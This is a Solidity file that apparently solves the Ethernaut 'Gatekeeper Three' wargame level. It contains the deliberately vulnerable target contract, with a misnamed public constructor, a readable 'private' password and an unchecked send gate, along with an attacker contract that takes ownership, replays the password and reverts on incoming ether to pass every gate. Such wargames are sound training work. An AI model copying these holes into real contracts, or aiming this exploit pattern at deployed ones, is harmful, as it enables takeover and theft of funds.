// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "hardhat/console.sol";

contract SimpleTrick {
    GatekeeperThree public target;
    address public trick;
    uint private password = block.timestamp;

    constructor (address payable _target) {
        target = GatekeeperThree(_target);
    }
        
    function checkPassword(uint _password) public returns (bool) {
        if (_password == password) {
        return true;
        }
        password = block.timestamp;
        return false;
    }
        
    function trickInit() public {
        trick = address(this);
    }
        
    function trickyTrick() public {
        if (address(this) == msg.sender && address(this) != trick) {
        target.getAllowance(password);
        }
    }
}

contract GatekeeperThree {
    address public owner;
    address public entrant;
    bool public allowEntrance;

    SimpleTrick public trick;

    function construct0r() public {
        owner = msg.sender;
    }

    modifier gateOne() {
        require(msg.sender == owner);
        require(tx.origin != owner);
        _;
    }

    modifier gateTwo() {
        require(allowEntrance == true);
        _;
    }

    modifier gateThree() {
        if (address(this).balance > 0.001 ether && payable(owner).send(0.001 ether) == false) {
        _;
        }
    }

    function getAllowance(uint _password) public {
        if (trick.checkPassword(_password)) {
            allowEntrance = true;
        }
    }

    function createTrick() public {
        trick = new SimpleTrick(payable(address(this)));
        trick.trickInit();
    }

    function enter() public gateOne gateTwo gateThree {
        entrant = tx.origin;
    }

    receive () external payable {}
}

contract TestGatekeeperThree {

	GatekeeperThree public g;

	constructor(address payable _g, uint _password) {
		g = GatekeeperThree(_g);
		g.construct0r();
		g.getAllowance(_password);
	}

	function attack() public payable {
		payable(address(g)).transfer(0.0011 ether);
		g.enter();
	}

	receive() external payable {
		revert("NOT ACCEPTING ETHER");
	}

	fallback() external payable {
		revert("NOT ACCEPTING ETHER");
	}
}